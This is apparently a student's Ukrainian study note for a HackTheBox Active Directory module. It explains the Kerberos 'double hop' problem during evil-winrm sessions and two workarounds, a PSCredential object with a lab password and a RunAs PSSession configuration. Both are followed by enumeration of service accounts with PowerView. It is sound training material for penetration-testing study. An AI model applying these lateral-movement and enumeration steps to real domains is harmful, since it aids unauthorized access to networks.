Kerberos "Double Hop" Problem
ℹ️ Informations
🌐 Website: HackTheBox

📚 Module: Active Directory Enumeration & Attacks

🔗 Link: Kerberos "Double Hop" Problem

📖 Theory
Double Hop — проблема виникає коли атакуючий намагається використати Kerberos-автентифікацію через два або більше хопи (Attack Host → DEV01 → DC01).

При підключенні через WinRM/evil-winrm використовується Kerberos TGS-квиток лише для доступу до конкретного ресурсу. TGT-квиток не передається у remote-сесію, тому при спробі звернутися далі (наприклад до DC) — отримуємо відмову у доступі.

При автентифікації через SMB/PSExec/RDP — NTLM-хеш кешується в пам'яті і доступний для наступних запитів.

🔧 Workaround #1: PSCredential Object
При підключенні через evil-winrm — явно передаємо credentials з кожним запитом:

powershell
# Підключились через evil-winrm, але PowerView не працює без credentials
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
# Exception: An operations error occurred.

# Перевіряємо cached tickets — є лише квиток для поточного сервера
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist
# Cached Tickets: (1) — лише для academy-aen-ms0$

# Створюємо PSCredential об'єкт
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\backupadm\Documents> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# Тепер передаємо credentials явно
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
text
samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqldev
...
🔧 Workaround #2: Register PSSession Configuration
Лише для Windows attack host (з GUI або RDP) — не працює через evil-winrm:

powershell
# Реєструємо нову PSSession конфігурацію з RunAs
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

# Перезапускаємо WinRM (відключить поточну сесію)
PS C:\htb> Restart-Service WinRM

# Підключаємось через нову конфігурацію
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess

# Тепер TGT кешований — Double Hop вирішений
[DEV01]: PS C:\Users\backupadm\Documents> klist
# Cached Tickets: (1) — krbtgt/INLANEFREIGHT.LOCAL

# PowerView працює без -credential
[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
text
samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
...
⚠️ Важливі обмеження
text
- Register-PSSessionConfiguration НЕ працює через evil-winrm (потрібен GUI)
- Register-PSSessionConfiguration НЕ працює з Linux attack host
- При RDP/PSExec NTLM-хеш кешується → Double Hop проблеми немає
- При WinRM/evil-winrm TGT НЕ передається → Double Hop проблема є
- Якщо на сервері увімкнено Unconstrained Delegation → проблеми немає
